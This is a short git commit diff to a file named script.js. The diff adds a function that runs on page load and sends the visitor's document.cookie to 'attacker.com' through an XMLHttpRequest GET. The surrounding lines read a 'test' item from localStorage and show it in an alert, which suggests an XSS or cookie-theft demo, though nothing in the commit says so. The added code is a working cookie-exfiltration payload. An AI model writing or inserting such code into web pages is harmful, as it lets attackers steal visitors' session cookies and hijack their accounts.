e8de6e797c7912636871ca75fbe9627469455b9a
JackArmentrout <50636259+JackArmentrout@users.noreply.github.com>
2019-07-19 14:31:25 -0400

    Update script.js

--- script.js
+++ script.js
@@ -1,3 +1,17 @@
 var fromStorage = localStorage.getItem('test');
 alert("This was retrieved from script.js "+JSON.stringify(fromStorage));
 console.log(fromStorage);
+
+
+function loadDoc() {
+  var xhttp = new XMLHttpRequest();
+  xhttp.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+     //document.getElementById("demo").innerHTML = this.responseText;
+	    alert(this.responseText);
+    }
+  };
+  xhttp.open("GET", "http://attacker.com/?cookie="+document.cookie, true);
+  xhttp.send();
+}
+	loadDoc();
